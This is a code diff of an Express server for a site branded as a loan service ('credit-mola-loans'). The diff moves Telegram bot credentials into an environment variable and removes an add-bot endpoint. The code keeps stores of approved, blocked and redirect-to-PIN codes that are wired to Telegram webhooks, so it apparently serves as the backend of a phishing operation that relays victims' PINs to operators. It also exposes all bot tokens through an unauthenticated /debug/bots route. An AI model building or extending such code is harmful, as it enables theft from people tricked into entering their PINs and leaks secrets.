@@ -3,18 +3,15 @@ const express = require('express');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
-const fs = require('fs');
-const { sendTelegramMessage } = require('./services/telegram'); // ✅ FIXED PATH
+const { sendTelegramMessage } = require('./services/telegram');
 const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ---------------- SET CORRECT BACKEND DOMAIN ----------------
+// ---------------- SET BACKEND DOMAIN ----------------
 const BACKEND_DOMAIN = "https://credit-mola-loans.onrender.com";
 const DISABLE_BOTS = process.env.DISABLE_BOTS === "true";
-
-const BOTS_FILE = path.join(__dirname, 'bots.json');
 
 // ---------------- MEMORY ----------------
 const approvedPins = {};
@@ -23,18 +20,18 @@ const blockPins = {};
 const redirectToPinCodes = {};
 const requestBotMap = {};
 
-// ---------------- MULTI-BOT ----------------
+// ---------------- MULTI-BOT (ENV BASED) ----------------
 let bots = [];
-if (fs.existsSync(BOTS_FILE)) {
+if (process.env.BOTS_JSON) {
     try {
-        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
-        console.log('✅ Bots loaded:', bots);
-    } catch {
+        bots = JSON.parse(process.env.BOTS_JSON);
+        console.log('✅ Bots loaded from .env:', bots.map(b => b.botId));
+    } catch (err) {
+        console.error('❌ Failed to parse BOTS_JSON', err.message);
         bots = [];
     }
 } else {
-    bots = [];
-    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
+    console.warn('⚠️ No BOTS_JSON found in environment');
 }
 
 // ---------------- MIDDLEWARE ----------------
@@ -43,6 +40,7 @@ app.use(cors({
     methods: ['GET','POST','OPTIONS'],
     allowedHeaders: ['Content-Type']
 }));
+app.options('*', cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
@@ -50,9 +48,6 @@ app.use(express.static('public'));
 // ---------------- HELPERS ----------------
 function getBot(botId) {
     return bots.find(b => b.botId === botId);
-}
-function saveBots() {
-    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
 }
 
 // ---------------- WEBHOOKS ----------------
@@ -147,25 +142,10 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     res.sendStatus(200);
 });
 
-// ---------------- ADD BOT ----------------
-app.post('/add-bot', async (req, res) => {
-    const { botId, botToken, chatId } = req.body;
-    if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'Missing fields' });
-    if (getBot(botId)) return res.status(400).json({ error: 'Bot exists' });
-
-    bots.push({ botId, botToken, chatId });
-    saveBots();
-    await setWebhookForBot({ botId, botToken });
-
-    res.json({ ok: true, botLink: `${BACKEND_DOMAIN}/bot/${botId}` });
-});
-
 // ---------------- DEBUG ----------------
 app.get('/debug/bots', (req, res) => res.json(bots));
 
 // ---------------- START ----------------
 setWebhooksForAllBots().then(() => {
-    app.listen(PORT, () => {
-        console.log(`🚀 Server running on ${PORT}`);
-    });
+    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT} (Domain: ${BACKEND_DOMAIN})`));
 });
